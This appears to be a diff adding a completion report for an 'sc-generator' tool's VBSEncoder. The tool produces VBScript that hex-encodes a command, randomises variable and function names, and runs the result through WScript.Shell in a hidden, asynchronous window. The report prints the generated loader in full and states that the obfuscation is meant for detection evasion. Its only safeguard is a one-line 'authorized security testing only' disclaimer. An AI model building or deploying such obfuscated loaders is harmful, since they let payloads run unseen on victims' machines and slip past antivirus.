@@ -1,0 +1,226 @@
+================================================================================
+                      HEX DECODER WITH EXECUTION HANDLER
+                          COMPLETE IMPLEMENTATION
+================================================================================
+
+SUMMARY
+-------
+The hex decoder has been enhanced with an execution handler that:
+1. Decodes hex-encoded strings using a DecodeHex function
+2. Converts hex pairs to characters using Chr(CLng("&H" + pair))
+3. Creates a WScript.Shell object
+4. Executes the decoded command via .Run() method
+5. Properly manages variables with obfuscation
+6. Cleans up resources by setting shell object to Nothing
+
+KEY FEATURES
+------------
+✓ Hex encoding/decoding for payload obfuscation
+✓ Random variable names (h_*, decoded_*, shell_*)
+✓ WScript.Shell execution with hidden window (Run parameter: 0)
+✓ Asynchronous execution (False parameter)
+✓ Variable matching verification
+✓ Proper object cleanup
+✓ No execution option available (execute=False)
+
+VARIABLE STRUCTURE
+------------------
+The decoder uses three key variables:
+
+1. hex_var (h_<random>)
+   - Stores the hex-encoded command
+   - Example: h_NFZemfWA
+   - Used in DecodeHex function call
+
+2. decoded_var (decoded_<random>)
+   - Stores the decoded command string
+   - Example: decoded_eNkURuRQ
+   - Assigned from DecodeHex() result
+   - Passed to shell.Run()
+
+3. shell_var (shell_<random>)
+   - Stores the WScript.Shell object
+   - Example: shell_I3X_fcjn
+   - Set via CreateObject
+   - Calls .Run() method
+   - Set to Nothing for cleanup
+
+EXECUTION FLOW
+--------------
+1. Define DecodeHex(h) function
+   ├─ Loops through hex string in pairs
+   ├─ Converts each pair to decimal via CLng("&H" + pair)
+   └─ Converts decimal to character via Chr()
+
+2. Declare and assign hex variable with encoded payload
+
+3. Declare and assign decoded variable by calling DecodeHex()
+
+4. (If execute=True) Create WScript.Shell and execute
+   ├─ Create shell object via CreateObject
+   ├─ Call .Run(decoded_var, 0, False)
+   │  ├─ 0 = Hidden window style
+   │  └─ False = Asynchronous (no wait)
+   └─ Clean up with Set object = Nothing
+
+
+COMPLETE EXAMPLE OUTPUT
+-----------------------
+
+Original Command: powershell.exe -NoProfile -Command "Write-Host 'Decoded'"
+
+Hex Encoding: 706f7765727368656c6c2e657865202d4e6f50726f66696c65202d436f6d6d616e64202257726974652d486f737420274465636f6465642722
+(114 hex characters representing the command)
+
+Generated VBS Code:
+====================================
+
+Function DecodeHexGlyYho8M(h)
+    Dim i, r
+    For i = 1 To Len(h) Step 2
+        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
+    Next
+    DecodeHexGlyYho8M = r
+End Function
+Dim h_NFZemfWA
+h_NFZemfWA = "706f7765727368656c6c2e657865202d4e6f50726f66696c65202d436f6d6d616e64202257726974652d486f737420274465636f6465642722"
+Dim decoded_eNkURuRQ
+decoded_eNkURuRQ = DecodeHexGlyYho8M(h_NFZemfWA)
+
+Dim shell_I3X_fcjn
+Set shell_I3X_fcjn = CreateObject("WScript.Shell")
+shell_I3X_fcjn.Run decoded_eNkURuRQ, 0, False
+Set shell_I3X_fcjn = Nothing
+
+====================================
+
+VARIABLE VERIFICATION
+---------------------
+All variables are properly declared before use:
+
+Declared Variables: decoded_eNkURuRQ, h_NFZemfWA, shell_I3X_fcjn, i, r
+
+Usage Count:
+• h_NFZemfWA: 3 times (declared, assigned, passed to function)
+• decoded_eNkURuRQ: 3 times (declared, assigned from function, passed to .Run)
+• shell_I3X_fcjn: 4 times (declared, Set, .Run call, Set to Nothing)
+• i: 2+ times (declared, used in loop)
+• r: 2+ times (declared, used in loop)
+
+All variables match their declarations - NO UNDEFINED VARIABLE ERRORS
+
+
+METHOD SIGNATURE
+----------------
+
+create_hex_decoder_vbs(self, text: str, execute: bool = False) -> str
+
+Parameters:
+    text (str): The command/string to encode and decode
+    execute (bool): If True, adds WScript.Shell execution handler
+                    If False, only generates decoder without execution
+
+Returns:
+    str: Complete VBS code with decoder and optional execution
+
+
+USAGE EXAMPLES
+--------------
+
+Example 1: Decoder only (no execution)
+    encoder = VBSEncoder()
+    vbs = encoder.create_hex_decoder_vbs("notepad.exe", execute=False)
+
+Example 2: Decoder with WScript.Shell execution
+    encoder = VBSEncoder()
+    vbs = encoder.create_hex_decoder_vbs("notepad.exe", execute=True)
+
+Example 3: Complex command with execution
+    cmd = 'cmd.exe /c "powershell.exe -NoProfile -Command \\"Write-Host 123\\""'
+    encoder = VBSEncoder()
+    vbs = encoder.create_hex_decoder_vbs(cmd, execute=True)
+
+
+TESTING
+-------
+All tests pass successfully:
+✓ TEST 1: Hex Decoder WITHOUT Execution
+✓ TEST 2: Hex Decoder WITH Execution
+✓ TEST 3: Variable Declaration and Usage Matching
+✓ COMPLETE HEX DECODER EXAMPLE
+
+Test Coverage:
+• Function structure verification
+• Variable declaration validation
+• Variable usage consistency
+• WScript.Shell creation and .Run() method call
+• Object cleanup (Set = Nothing)
+• Hex encoding/decoding logic
+
+
+SECURITY NOTES
+--------------
+⚠ This code is for AUTHORIZED SECURITY TESTING ONLY
+
+Obfuscation techniques used:
+• Hex encoding of command payload
+• Randomized variable and function names
+• Hidden window execution (style=0)
+• Asynchronous execution (wait=False)
+
+Detection evasion:
+• Variable names don't match signature patterns
+• Hex encoding obscures payload
+• Multiple encoding layers available (base64, hex, array)
+
+
+FILES MODIFIED
+--------------
+/home/user/sc-generator/vbs_encoder.py
+  - Modified create_hex_decoder_vbs() method
+  - Added execute parameter
+  - Added WScript.Shell execution handler
+  - Improved variable naming consistency
+
+Test file created:
+/home/user/sc-generator/test_hex_decoder_execution.py
+  - Comprehensive test suite
+  - Variable validation
+  - Execution verification
+  - Usage examples
+
+
+IMPLEMENTATION DETAILS
+----------------------
+
+HEX DECODER FUNCTION (DecodeHex):
+    Function DecodeHex<random>(h)
+        Dim i, r
+        For i = 1 To Len(h) Step 2
+            r = r & Chr(CLng("&H" & Mid(h, i, 2)))
+        Next
+        DecodeHex<random> = r
+    End Function
+
+How it works:
+1. Iterate through hex string 2 characters at a time
+2. Extract pair using Mid(h, i, 2)
+3. Prepend "&H" to create hex literal (e.g., "&H6E")
+4. Convert to decimal using CLng
+5. Convert decimal to character using Chr
+6. Concatenate all characters to build decoded string
+
+EXECUTION HANDLER (if execute=True):
+    Dim shell_<random>
+    Set shell_<random> = CreateObject("WScript.Shell")
+    shell_<random>.Run decoded_<random>, 0, False
+    Set shell_<random> = Nothing
+
+How it works:
+1. Declare shell variable
+2. Create WScript.Shell COM object
+3. Call .Run() method with decoded command
+4. Run parameters: (command, window_style=0, wait_for_completion=False)
+5. Clean up by setting object to Nothing
+
+================================================================================
